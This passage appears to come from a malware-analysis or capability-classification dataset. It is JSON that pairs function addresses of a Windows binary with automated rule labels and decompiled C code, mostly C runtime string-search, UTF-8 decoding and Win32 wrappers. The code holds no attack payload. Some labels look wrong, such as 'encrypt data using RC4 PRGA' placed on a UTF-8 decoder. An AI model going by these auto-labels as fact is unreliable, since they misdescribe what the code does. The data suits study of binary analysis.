uVar3;\n            iVar6 = 0x1f;\n            if (uVar3 != 0) {\n                for (; uVar3 >> iVar6 == 0; iVar6 = iVar6 + -1) {\n                }\n            }\n            pauVar4 = pcVar8 + iVar6;\n            if (uVar3 == 0) {\n                pauVar4 = pauVar7;\n            }\n            return pauVar4;\n        }\n        uVar3 = param_2;\n        if (uVar3 == 0) {\n            pcVar8 = param_1 & 0xfffffff0;\n            auVar15 = CONCAT115(-(pcVar8[0xf] == '\\0'), \n                                CONCAT114(-(pcVar8[0xe] == '\\0'), \n                                          CONCAT113(-(pcVar8[0xd] == '\\0'), \n                                                    CONCAT112(-(pcVar8[0xc] == '\\0'), \n                                                              CONCAT111(-(pcVar8[0xb] == '\\0'), \n                                                                        CONCAT110(-(pcVar8[10] == '\\0'), \n                                                                                  CONCAT19(-(pcVar8[9] == '\\0'), \n                                                                                           CONCAT18(-(pcVar8[8] == '\\0')\n                                                                                                    , CONCAT17(-(pcVar8[\n                                                            7] == '\\0'), \n                                                            CONCAT16(-(pcVar8[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar8[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar8[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar8[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar8[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar8[1] == '\\0'), -(*pcVar8 == '\\0'))))))))))))\n                                                            ))));\n            uVar3 = (SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                     (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (-(pcVar8[0xf] == '\\0') >> 7) << 0xf) &\n                    -1 << (param_1 & 0xf);\n            while (uVar3 == 0) {\n                pcVar1 = pcVar8 + 0x1f;\n                auVar15 = CONCAT115(-(*pcVar1 == '\\0'), \n                                    CONCAT114(-(pcVar8[0x1e] == '\\0'), \n                                              CONCAT113(-(pcVar8[0x1d] == '\\0'), \n                                                        CONCAT112(-(pcVar8[0x1c] == '\\0'), \n                                                                  CONCAT111(-(pcVar8[0x1b] == '\\0'), \n                                                                            CONCAT110(-(pcVar8[0x1a] == '\\0'), \n                                                                                      CONCAT19(-(pcVar8[0x19] == '\\0'), \n                                                                                               CONCAT18(-(pcVar8[0x18]\n                                                                                                         == '\\0'), \n                                                                                                        CONCAT17(-(\n                                                            pcVar8[0x17] == '\\0'), \n                                                            CONCAT16(-(pcVar8[0x16] == '\\0'), \n                                                                     CONCAT15(-(pcVar8[0x15] == '\\0'), \n                                                                              CONCAT14(-(pcVar8[0x14] == '\\0'), \n                                                                                       CONCAT13(-(pcVar8[0x13] == '\\0')\n                                                                                                , CONCAT12(-(pcVar8[0x12\n                                                            ] == '\\0'), \n                                                            CONCAT11(-(pcVar8[0x11] == '\\0'), -(pcVar8[0x10] == '\\0'))))\n                                                            ))))))))))));\n                pcVar8 = pcVar8 + 0x10;\n                uVar3 = SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (-(*pcVar1 == '\\0') >> 7) << 0xf;\n            }\n            iVar6 = 0;\n            if (uVar3 != 0) {\n                for (; (uVar3 >> iVar6 & 1) == 0; iVar6 = iVar6 + 1) {\n                }\n            }\n            pauVar7 = pcVar8 + iVar6;\n        }\n        else {\n            pauVar7 = NULL;\n            uVar5 = param_1 & 0xf;\n            while (uVar5 != 0) {\n                if ((*param_1)[0] == uVar3) {\n                    pauVar7 = param_1;\n                }\n                if ((*param_1)[0] == 0) {\n                    return pauVar7;\n                }\n                param_1 = *param_1 + 1;\n                uVar5 = param_1 & 0xf;\n            }\n            do {\n                pauVar4 = param_1[1];\n                iVar6 = pcmpistri(ZEXT416(uVar3), *param_1, 0x40);\n                if (0xffffffef < param_1) {\n                    pauVar7 = pauVar4[-1] + iVar6;\n                }\n                param_1 = pauVar4;\n            } while (pauVar4 != NULL);\n        }\n        return pauVar7;\n    }\n    iVar6 = -1;\n    do {\n        pauVar7 = param_1;\n        if (iVar6 == 0) break;\n        iVar6 = iVar6 + -1;\n        pauVar7 = *param_1 + 1;\n        puVar2 = *param_1;\n        param_1 = pauVar7;\n    } while (*puVar2 != '\\0');\n    iVar6 = -(iVar6 + 1);\n    puVar10 = pauVar7[-1] + 0xf;\n    do {\n        puVar9 = puVar10;\n        if (iVar6 == 0) break;\n        iVar6 = iVar6 + -1;\n        puVar9 = puVar10 + -1;\n        uVar12 = *puVar10;\n        puVar10 = puVar9;\n    } while (param_2 != uVar12);\n    pauVar7 = puVar9 + 1;\n    if ((*pauVar7)[0] != param_2) {\n        pauVar7 = NULL;\n    }\n    return pauVar7;\n}\n",
        "token_count": 4331
    },
    "004c3a4e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004c3a4e(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_stack_ffffffec;\n    char acStack16 [8];\n    uint32_t uStack8;\n    \n    uStack8 = *0x56cca8 ^ &stack0xfffffffc;\n    if ((*(param_2 + 0xc) >> 0xc & 1) == 0) {\n        iVar1 = fcn.00405f06(param_2);\n        iVar3 = 0x56cf68;\n        if ((iVar1 == -1) || (iVar1 = fcn.00405f06(param_2),  iVar1 == -2)) {\n            iVar1 = 0x56cf68;\n        }\n        else {\n            iVar1 = fcn.00405f06(param_2);\n            uVar2 = fcn.00405f06(param_2);\n            iVar1 = *((iVar1 >> 6) * 4 + 0x570220) + (uVar2 & 0x3f) * 0x38;\n        }\n        if ((*(iVar1 + 0x29) != '\\x02') && (*(iVar1 + 0x29) != '\\x01')) {\n            iVar1 = fcn.00405f06(param_2);\n            if ((iVar1 != -1) && (iVar1 = fcn.00405f06(param_2),  iVar1 != -2)) {\n                iVar1 = fcn.00405f06(param_2);\n                uVar2 = fcn.00405f06(param_2);\n                iVar3 = *((iVar1 >> 6) * 4 + 0x570220) + (uVar2 & 0x3f) * 0x38;\n            }\n            if (*(iVar3 + 0x28) < '\\0') {\n                iVar1 = fcn.00402a68(&stack0xffffffec, acStack16, 5, param_1);\n                if ((iVar1 == 0) && (iVar1 = 0,  0 < in_stack_ffffffec)) {\n                    do {\n                        iVar3 = fcn.0040464c(acStack16[iVar1], param_2);\n                        if (iVar3 == -1) break;\n                        iVar1 = iVar1 + 1;\n                    } while (iVar1 < in_stack_ffffffec);\n                }\n                goto code_r0x004c39d7;\n            }\n        }\n        fcn.004c387f(param_1, param_2);\n    }\n    else {\n        fcn.004c387f(param_1, param_2);\n    }\ncode_r0x004c39d7:\n    fcn.00403085(in_stack_ffffffec);\n    return;\n}\n",
        "token_count": 630
    },
    "004c5885": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint8_t * fcn.004c5885(uint8_t *param_1, uint8_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0;\n    uStack40 = 0;\n    for (; uVar1 = *param_2,  uVar1 != 0; param_2 = param_2 + 1) {\n        puVar2 = &uStack40 + (uVar1 >> 3);\n        *puVar2 = *puVar2 | '\\x01' << (uVar1 & 7);\n    }\n    do {\n        puVar3 = param_1;\n        puVar2 = *puVar3;\n        if (*puVar3 == 0) {\n            return puVar2;\n        }\n        param_1 = puVar3 + 1;\n    } while ((*(&uStack40 + (puVar2 >> 3)) >> (puVar2 & 7) & 1) == 0);\n    return puVar3;\n}\n",
        "token_count": 338
    },
    "004c5892": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint16_t * fcn.004c5892(int16_t *param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    \n    if (*param_1 != 0) {\n        do {\n            if (*param_2 != 0) {\n                iVar1 = *param_1;\n                piVar3 = param_2;\n                iVar2 = *param_2;\n                do {\n                    if (iVar2 == iVar1) {\n                        return param_1;\n                    }\n                    piVar3 = piVar3 + 1;\n                    iVar2 = *piVar3;\n                    iVar1 = *param_1;\n                } while (iVar2 != 0);\n            }\n            param_1 = param_1 + 1;\n        } while (*param_1 != 0);\n    }\n    return NULL;\n}\n",
        "token_count": 198
    },
    "004c7934": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t * fcn.004c7934(uint32_t *param_1, char param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    uchar auVar8 [16];\n    char cVar10;\n    char cVar11;\n    char cVar12;\n    char cVar13;\n    char cVar14;\n    char cVar15;\n    char cVar16;\n    uchar auVar9 [16];\n    \n    if (*0x56ec4c != 0) {\n        auVar9 = pshuflw(ZEXT216(CONCAT11(param_2, param_2)), ZEXT216(CONCAT11(param_2, param_2)), 0);\n        uVar3 = -1 << (param_1 & 0xf);\n        pcVar7 = param_1 - (param_1 & 0xf);\n        while( true ) {\n            cVar2 = SUB161(auVar9, 0);\n            cVar10 = SUB161(auVar9 >> 8, 0);\n            cVar11 = SUB161(auVar9 >> 0x10, 0);\n            cVar12 = SUB161(auVar9 >> 0x18, 0);\n            cVar13 = SUB161(auVar9 >> 0x20, 0);\n            cVar14 = SUB161(auVar9 >> 0x28, 0);\n            cVar15 = SUB161(auVar9 >> 0x30, 0);\n            cVar16 = SUB161(auVar9 >> 0x38, 0);\n            auVar8 = CONCAT115(-(pcVar7[0xf] == '\\0'), \n                               CONCAT114(-(pcVar7[0xe] == '\\0'), \n                                         CONCAT113(-(pcVar7[0xd] == '\\0'), \n                                                   CONCAT112(-(pcVar7[0xc] == '\\0'), \n                                                             CONCAT111(-(pcVar7[0xb] == '\\0'), \n                                                                       CONCAT110(-(pcVar7[10] == '\\0'), \n                                                                                 CONCAT19(-(pcVar7[9] == '\\0'), \n                                                                                          CONCAT18(-(pcVar7[8] == '\\0')\n                                                                                                   , CONCAT17(-(pcVar7[7\n                                                            ] == '\\0'), \n                                                            CONCAT16(-(pcVar7[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar7[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar7[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar7[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar7[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar7[1] == '\\0'), -(*pcVar7 == '\\0'))))))))))))\n                                                            )))) |\n                     CONCAT115(-(pcVar7[0xf] == cVar16), \n                               CONCAT114(-(pcVar7[0xe] == cVar15), \n                                         CONCAT113(-(pcVar7[0xd] == cVar14), \n                                                   CONCAT112(-(pcVar7[0xc] == cVar13), \n                                                             CONCAT111(-(pcVar7[0xb] == cVar12), \n                                                                       CONCAT110(-(pcVar7[10] == cVar11), \n                                                                                 CONCAT19(-(pcVar7[9] == cVar10), \n                                                                                          CONCAT18(-(pcVar7[8] == cVar2)\n                                                                                                   , CONCAT17(-(pcVar7[7\n                                                            ] == cVar16), \n                                                            CONCAT16(-(pcVar7[6] == cVar15), \n                                                                     CONCAT15(-(pcVar7[5] == cVar14), \n                                                                              CONCAT14(-(pcVar7[4] == cVar13), \n                                                                                       CONCAT13(-(pcVar7[3] == cVar12), \n                                                                                                CONCAT12(-(pcVar7[2] ==\n                                                                                                          cVar11), \n                                                                                                         CONCAT11(-(\n                                                            pcVar7[1] == cVar10), -(*pcVar7 == cVar2))))))))))))))));\n            uVar3 = (SUB161(auVar8 >> 7, 0) & 1 | (SUB161(auVar8 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar8 >> 0x17, 0) & 1) << 2 | (SUB161(auVar8 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar8 >> 0x27, 0) & 1) << 4 | (SUB161(auVar8 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar8 >> 0x37, 0) & 1) << 6 | (SUB161(auVar8 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar8 >> 0x47, 0) & 1) << 8 | (SUB161(auVar8 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar8 >> 0x57, 0) & 1) << 10 | (SUB161(auVar8 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar8 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar8 >> 0x6f, 0) & 1) << 0xd |\n                     (SUB161(auVar8 >> 0x77, 0) & 1) << 0xe | SUB161(auVar8 >> 0x7f, 0) << 0xf) & uVar3;\n            if (uVar3 != 0) break;\n            uVar3 = 0xffffffff;\n            pcVar7 = pcVar7 + 0x10;\n        }\n        iVar1 = 0;\n        if (uVar3 != 0) {\n            for (; (uVar3 >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n            }\n        }\n        puVar4 = pcVar7 + iVar1;\n        if (cVar2 != *puVar4) {\n            puVar4 = NULL;\n        }\n        return puVar4;\n    }\n    uVar3 = param_1 & 3;\n    while (uVar3 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar3 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar3 = *param_1;\n            uVar6 = uVar3 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar5 = uVar3 ^ 0xffffffff ^ uVar3 + 0x7efefeff;\n            puVar4 = param_1 + 1;\n            if (((uVar6 ^ 0xffffffff ^ uVar6 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar4;\n            if ((uVar5 & 0x81010100) != 0) {\n                if ((uVar5 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar3 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar3 = *param_1;\n        if (uVar3 == param_2) {\n            return param_1;\n        }\n        if (uVar3 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar3 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar3 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar3 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar4;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 1965
    },
    "004c7941": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint16_t * fcn.004c7941(uint16_t *param_1, uint16_t param_2)\n\n{\n    int32_t iVar1;\n    uchar auVar2 [16];\n    uchar auVar3 [16];\n    uint16_t uVar4;\n    uint16_t uVar5;\n    int32_t iStack52;\n    \n    if (0 < *0x56ec4c) {\n        auVar2 = pshuflw(ZEXT216(param_2), ZEXT216(param_2), 0);\n        do {\n            if ((param_1 & 0xfff) < 0xff1) {\n                uVar4 = SUB162(auVar2, 0);\n                uVar5 = SUB162(auVar2 >> 0x10, 0);\n                auVar3 = CONCAT214(-(param_1[7] == 0), \n                                   CONCAT212(-(param_1[6] == 0), \n                                             CONCAT210(-(param_1[5] == 0), \n                                                       CONCAT28(-(param_1[4] == 0), \n                                                                CONCAT26(-(param_1[3] == 0), \n                                                                         CONCAT24(-(param_1[2] == 0), \n                                                                                  CONCAT22(-(param_1[1] == 0), \n                                                                                           -(*param_1 == 0)))))))) |\n                         CONCAT214(-(param_1[7] == uVar5), \n                                   CONCAT212(-(param_1[6] == uVar4), \n                                             CONCAT210(-(param_1[5] == uVar5), \n                                                       CONCAT28(-(param_1[4] == uVar4), \n                                                                CONCAT26(-(param_1[3] == uVar5), \n                                                                         CONCAT24(-(param_1[2] == uVar4), \n                                                                                  CONCAT22(-(param_1[1] == uVar5), \n                                                                                           -(*param_1 == uVar4))))))));\n                uVar4 = SUB161(auVar3 >> 7, 0) & 1 | (SUB161(auVar3 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar3 >> 0x17, 0) & 1) << 2 | (SUB161(auVar3 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar3 >> 0x27, 0) & 1) << 4 | (SUB161(auVar3 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar3 >> 0x37, 0) & 1) << 6 | (SUB161(auVar3 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar3 >> 0x47, 0) & 1) << 8 | (SUB161(auVar3 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar3 >> 0x57, 0) & 1) << 10 | (SUB161(auVar3 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar3 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar3 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar3 >> 0x77, 0) & 1) << 0xe | SUB161(auVar3 >> 0x7f, 0) << 0xf;\n                if (uVar4 != 0) goto code_r0x004e1112;\n                iStack52 = 0x10;\n            }\n            else {\n                if (*param_1 == param_2) {\n                    return param_1;\n                }\n                if (*param_1 == 0) {\n                    return NULL;\n                }\n                iStack52 = 2;\n            }\n            param_1 = param_1 + iStack52;\n        } while( true );\n    }\n    uVar4 = *param_1;\n    while ((uVar4 != 0 && (uVar4 != param_2))) {\n        param_1 = param_1 + 1;\n        uVar4 = *param_1;\n    }\ncode_r0x004e10b4:\n    return (uVar4 != param_2) - 1 & param_1;\ncode_r0x004e1112:\n    iVar1 = 0;\n    if (uVar4 != 0) {\n        for (; (uVar4 >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n        }\n    }\n    param_1 = param_1 + iVar1;\n    uVar4 = *param_1;\n    goto code_r0x004e10b4;\n}\n",
        "token_count": 1095
    },
    "004def32": {
        "rules": [
            "contain loop",
            "encrypt data using RC4 PRGA"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004def32(uint32_t param_1, uint8_t *param_2, uint32_t param_3, uint32_t *param_4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar4;\n    uint32_t uVar3;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    uint32_t *puVar7;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    char cStack23;\n    uint8_t uStack22;\n    char cStack21;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint32_t uStack8;\n    \n    uStack8 = *0x56cca8 ^ &stack0xfffffffc;\n    if (param_4 == NULL) {\n        param_4 = 0x57070c;\n    }\n    puVar6 = param_2;\n    if (param_2 == NULL) {\n        param_3 = 1;\n        puVar6 = 0x54c277;\n    }\n    puVar7 = -(param_2 != NULL) & param_1;\n    if (param_3 == 0) goto code_r0x004deeba;\n    if (*(param_4 + 6) == 0) {\n        uStack22 = *puVar6;\n        puVar6 = puVar6 + 1;\n        if (-1 < uStack22) {\n            if (puVar7 != NULL) {\n                *puVar7 = uStack22;\n            }\n            goto code_r0x004deeba;\n        }\n        if ((uStack22 & 0xe0) == 0xc0) {\n            cStack21 = '\\x02';\n        }\n        else if ((uStack22 & 0xf0) == 0xe0) {\n            cStack21 = '\\x03';\n        }\n        else {\n            if ((uStack22 & 0xf8) != 0xf0) goto code_r0x004deeb3;\n            cStack21 = '\\x04';\n        }\n        cStack23 = cStack21;\n        uVar3 = CONCAT11(cStack21, cStack21);\n        uVar5 = (1 << (7U - cStack21 & 0x1f)) - 1U & uStack22;\ncode_r0x004dee07:\n        uVar2 = uVar3 >> 8;\n        uStack32 = param_3;\n        if (uVar2 < param_3) {\n            uStack32 = uVar2;\n        }\n        uStack28 = puVar6 - param_2;\n        while (uStack28 < uStack32) {\n            uVar1 = *puVar6;\n            puVar6 = puVar6 + 1;\n            uStack28 = uStack28 + 1;\n            if ((uVar1 & 0xc0) != 0x80) goto code_r0x004deeb3;\n            uVar5 = uVar5 << 6 | uVar1 & 0x3f;\n        }\n        if (uStack32 < uVar2) {\n            *(param_4 + 1) = uVar3;\n            *param_4 = uVar5;\n            *(param_4 + 6) = (uVar3 >> 8) - uStack32;\n            goto code_r0x004deeba;\n        }\n        if (((uVar5 < 0xd800) || (0xdfff < uVar5)) && (uVar5 < 0x110000)) {\n            uStack20 = 0x80;\n            uStack16 = 0x800;\n            uStack12 = 0x10000;\n            if ((&uStack28)[uVar3 & 0xff] <= uVar5) {\n                if (puVar7 != NULL) {\n                    *puVar7 = uVar5;\n                }\n                *param_4 = 0;\n                param_4[1] = 0;\n                goto code_r0x004deeba;\n            }\n        }\n    }\n    else {\n        uVar1 = *(param_4 + 1);\n        uVar5 = *param_4;\n        uVar3 = CONCAT11(*(param_4 + 6), uVar1);\n        if (((uVar1 - 2 < 3) && (uVar4 = uVar3 >> 8,  uVar4 != 0)) && (uVar4 < uVar1)) goto code_r0x004dee07;\n    }\ncode_r0x004deeb3:\n    fcn.004025c7(param_4);\ncode_r0x004deeba:\n    fcn.00403085(param_2);\n    return;\n}\n",
        "token_count": 1052
    },
    "004c9c53": {
        "rules": [
            "print debug messages"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c9c53(uint *arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(*arg_8h);\n    return;\n}\n",
        "token_count": 43
    },
    "004c778e": {
        "rules": [
            "set environment variable"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004c778e(uint *arg_8h, uint *arg_ch)\n\n{\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(*arg_8h, *arg_ch);\n    return;\n}\n",
        "token_count": 51
    },
    "004066e5": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066e5(uint ExceptionInfo)\n\n{\n    uint uVar1;\n    \n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(ExceptionInfo);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 101
    },
    "00404746": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404746(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.004c7e1f();\n    if (pcVar1 == NULL) {\n        uVar2 = fcn.00403bb6(arg_8h, 0);\n        (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(uVar2);\n    }\n    else {\n        (**0x573000)(arg_8h, arg_ch, arg_10h, arg_14h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 152
    }
}